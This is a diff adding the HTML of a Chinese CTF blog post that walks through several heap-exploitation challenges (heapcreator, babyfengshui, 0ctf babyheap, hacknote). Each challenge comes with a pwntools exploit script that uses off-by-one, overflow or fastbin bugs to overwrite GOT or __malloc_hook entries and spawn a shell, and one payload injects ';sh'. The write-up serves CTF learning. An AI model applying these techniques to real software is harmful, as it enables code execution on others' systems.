@@ -1,0 +1,378 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PWN-几个简单堆题 | 此间的少年</title><meta name="author" content="此间的少年"><meta name="copyright" content="此间的少年"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="1.hitcontraining_heapcreator一次add函数先申请固定0x10大小的chunk，又申请一个可控大小的chunk，其中第一个固定chunk的数据段存放第二个chunk的大小和第二个chunk的数据地址。  show函数会通过固定chunk块的数据地址找到固定chunk块打印内容。 漏洞点：edit编辑的时候，会读入size+1个字节，存在off-by-one漏洞。 漏洞利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN-几个简单堆题">
+<meta property="og:url" content="http://example.com/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/index.html">
+<meta property="og:site_name" content="此间的少年">
+<meta property="og:description" content="1.hitcontraining_heapcreator一次add函数先申请固定0x10大小的chunk，又申请一个可控大小的chunk，其中第一个固定chunk的数据段存放第二个chunk的大小和第二个chunk的数据地址。  show函数会通过固定chunk块的数据地址找到固定chunk块打印内容。 漏洞点：edit编辑的时候，会读入size+1个字节，存在off-by-one漏洞。 漏洞利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/pwn.png">
+<meta property="article:published_time" content="2023-08-01T09:54:11.000Z">
+<meta property="article:modified_time" content="2023-08-01T09:57:11.543Z">
+<meta property="article:author" content="此间的少年">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/pwn.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: 此间的少年","link":"Link: ","source":"Source: 此间的少年","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN-几个简单堆题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-01 17:57:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/title.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/pwn.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">此间的少年</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN-几个简单堆题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-01T09:54:11.000Z" title="Created 2023-08-01 17:54:11">2023-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-08-01T09:57:11.543Z" title="Updated 2023-08-01 17:57:11">2023-08-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>11min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN-几个简单堆题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-hitcontraining-heapcreator"><a href="#1-hitcontraining-heapcreator" class="headerlink" title="1.hitcontraining_heapcreator"></a>1.hitcontraining_heapcreator</h2><p>一次add函数先申请固定0x10大小的chunk，又申请一个可控大小的chunk，其中第一个固定chunk的数据段存放第二个chunk的大小和第二个chunk的数据地址。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pP9sl2d"><img src="https://s1.ax1x.com/2023/07/31/pP9sl2d.png" alt="pP9sl2d.png"></a></p>
+<p>show函数会通过固定chunk块的数据地址找到固定chunk块打印内容。</p>
+<p>漏洞点：edit编辑的时候，会读入size+1个字节，存在off-by-one漏洞。</p>
+<p>漏洞利用：</p>
+<ul>
+<li>通过off-by-one漏洞在修改chunk0时修改chunk1的size字段为较大字段0x81，此时free(1)再malloc(0x70)会将free掉的chunk1申请回来，并且申请回来的是0x80大小的chunk，这0x80大小的chunk是覆盖chunk2的，这样就实现了通过chunk1可以溢出到chunk2的内容（因为正常申请和释放是控制不到那个固定chunk块的，edit只能修改包含data的那个自定义chunk块）</li>
+<li>修改chunk2的固定chunk块的chunk地址为free的got表地址，这样show调用时会打印处got表地址存放的内容，也就是free在libc中的真实地址，进而得到system地址。</li>
+<li>得到了system的地址，接下来将free_got表内容替换成system，执行free就是执行system，由于<strong>edit(2)是向chunk2的固定chunk块中的数据地址处写内容</strong>，因此替换成free got表后就是向free got中写内容了，直接改为system，并且在之前chunk0中写入“&#x2F;bin&#x2F;sh”，free(0)获取shell</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x70</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x8</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"><span class="comment">#create(0x70,p64(0)*14)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;free_addr: &#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-babyfengshui-33c3-2016"><a href="#2-babyfengshui-33c3-2016" class="headerlink" title="2.babyfengshui_33c3_2016"></a>2.babyfengshui_33c3_2016</h2><p>add函数中首先申请一个自定义大小chunk，之后申请一个固定0x80大小的chunk，自定义chunk中存放数据，固定chunk中存放自定义chunk的地址和chunk name。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pP9s1xA"><img src="https://s1.ax1x.com/2023/07/31/pP9s1xA.png" alt="pP9s1xA.png"></a></p>
+<p>free函数会首先free掉自定义chunk，再free掉含chunk name的chunk。</p>
+<p>edit函数中存在一个对填充size的判断，即固定chunk地址+chunk size &lt; chunk name地址时才可输入数据，意思就是最多只能输入chunk的size大小的数据。但该判断中存在漏洞，由于free的时候首先free上方的chunk，再free下方的chunk，free下方的chunk时会与上方的chunk进行合并。此时再malloc一个合并大小的size，那么自定义chunk回到原位置，固定chunk重新申请，位于heap最高处。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam1&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>) </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam2&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam3&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)     //释放后，chunk0 size变为<span class="number">0x111</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;nam1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&quot;cccc&quot;</span>)   malloc后自定义chunk回到原处，固定0x80chunk重新申请。</span><br></pre></td></tr></table></figure>
+
+<p>由于该原因，我们自定义chunk和包含name的chunk并不一定相邻，因此通过该方法之后，一个chunk块位于最上方，另一个chunk name块位于最下方，我们可以edit的size很大，就存在了堆溢出。</p>
+<p>之后，利用堆溢出修改chunk1_name中存储的chunk1地址为free_got，调用show(1)就可以打印出free_got的真实地址，进而得到system地址，之后同上题，edit也是向name_chunk的数据地址中写内容，即向free_got表中写内容，直接修改为system，并在之前chunk2布置好”&#x2F;bin&#x2F;sh”，调用free(2)即执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam1&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam2&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam3&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;nam1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p32(free_got)</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x80</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-0ctf-2017-babyheap"><a href="#3-0ctf-2017-babyheap" class="headerlink" title="3.0ctf_2017_babyheap"></a>3.0ctf_2017_babyheap</h2><p>add函数申请一块自定义大小的chunk，程序中存在一个结构体：分别存放是否已申请，chunk大小以及chunk的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="built_in">list</span> + i) = <span class="number">1</span>;</span><br><span class="line">*(<span class="built_in">list</span> + i + <span class="number">8</span>) = size;</span><br><span class="line">*(<span class="built_in">list</span> + i + <span class="number">16</span>) = addr;</span><br></pre></td></tr></table></figure>
+
+<p>edit函数未检查输入大小，存在堆溢出。</p>
+<p>show函数打印chunk size大小的数据。</p>
+<p>利用思路：</p>
+<ul>
+<li><p>首先申请chunk1、2、3</p>
+</li>
+<li><p>通过修改chunk1的size大小为chunk1_size + chunk2_size，free(1)再malloc(chunk1_size + chunk2_size),chunk1会申请回远处，但此时chunk1 size为chunk1_size + chunk2_size，因此chunk1包含了chunk2，此时show(1)可以打印出chunk2的内容。</p>
+</li>
+<li><p>因为add是调用的alloc，申请chunk1时chunk2内容包括大小以被清0，因此要重新为chunk2大小复制，通过chunk1还原chunk2的size（unsorted bin size &gt;&#x3D; 0x80）。</p>
+</li>
+<li><p>利用unsorted bin leak 通过free(2)将chunk2的fd显示出main_arean地址，通过show(1)打印出chunk2的内容，即main_arena地址，获取libcbase，再获取one_gadget地址。</p>
+</li>
+<li><p>接着利用fastbin attack(原理类似double free attack)，申请两块chunk4、5，free(5)，修改5的fd为target_addr即malloc_hook-0x23处的fake_chunk,申请chunk5，再次申请即可申请到target_chunk,修改malloc_hook为one_gadget，调用add获取shell。</p>
+</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#chunk 0</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#chunk 1</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#chunk 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#chunk 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit chunk1_size</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x121</span>) </span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#re_alloc chunk1</span></span><br><span class="line">alloc(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit chunk2_size</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free 2 to unsorted_bin</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#re_alloc chunk2 </span></span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#chunk 4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#chunk 5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)  <span class="comment">#re_alloc chunk5</span></span><br><span class="line">alloc(<span class="number">0x60</span>)  <span class="comment">#alloc fake_chunk</span></span><br><span class="line"></span><br><span class="line">one_gadget = libcbase + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-pwnable-hacknote"><a href="#4-pwnable-hacknote" class="headerlink" title="4.pwnable_hacknote"></a>4.pwnable_hacknote</h2><p>add中：申请一块内存，指向puts函数，之后再该位置+8处再申请一块size大小的内存填充数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;<span class="built_in">list</span> + i) = malloc(0x10uLL);</span><br><span class="line">(_QWORD *)*(&amp;<span class="built_in">list</span> + i) = puts();</span><br><span class="line"> read(<span class="number">0</span>, buf, 8uLL);</span><br><span class="line"> size = atoi(buf);</span><br><span class="line"> read(<span class="number">0</span>, *((void **)*(&amp;<span class="built_in">list</span> + i) + <span class="number">1</span>), size);</span><br></pre></td></tr></table></figure>
+
+<p>free中：删除+8位置chunk再删除该chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(*((void **)*(&amp;<span class="built_in">list</span> + i) + <span class="number">1</span>));</span><br><span class="line">free(*(&amp;<span class="built_in">list</span> + i));</span><br></pre></td></tr></table></figure>
+
+<p>show中：调用指向的puts函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(void (__fastcall **)(_QWORD))*(&amp;<span class="built_in">list</span> + i))(*(&amp;<span class="built_in">list</span> + i));</span><br></pre></td></tr></table></figure>
+
+<p>利用：</p>
+<p>原理：add一次会申请两块内存，分别存放puts函数和输入的数据，由于第一块内存永为0x20，因此我们输入的数据chunk大小为不等0x20块。这样申请完并且f’ree后：</p>
+<p>fastbin中：</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCflJts"><img src="https://s1.ax1x.com/2023/07/12/pCflJts.png" alt="pCflJts.png"></a></p>
+<p>此时，malloc一个chunk会首先申请到0x20的第一个chunk，由于输入大小为0x10，因此我们填入的数据段的chunk即为0x20中的第二个chunk，因为fast bin chunk 中链表为 chunk1-&gt;chunk0，所以我们填入的数据段就是chunk0的puts函数段，修改puts函数的参数地址为free_got地址，show调用即可打印出free_got真实地址，进而获取到system地址。</p>
+<p>之后，再次delete后add（通过这种方式实现edit修改内容)，修改puts函数地址为system函数地址，puts参数地址为binsh，由于system参数需要是binsh地址，所以直接写入”&#x2F;bin&#x2F;sh“不行，但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以成功将content位置覆盖成 ‘;sh\0’或||sh，同样的然后show（chunk1）就能执行system（‘sh’）得到shell了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = free_addr + offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p32(system)+ <span class="string">b&#x27;;sh\0&#x27;</span></span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-pwnable-hacknote"><a href="#5-pwnable-hacknote" class="headerlink" title="5.pwnable_hacknote"></a>5.pwnable_hacknote</h2><p>edit函数存在漏洞，当输入的size &#x3D;&#x3D; chunk size + 10时，可以输入size + 1个字节数据，即存在off-by-one漏洞。</p>
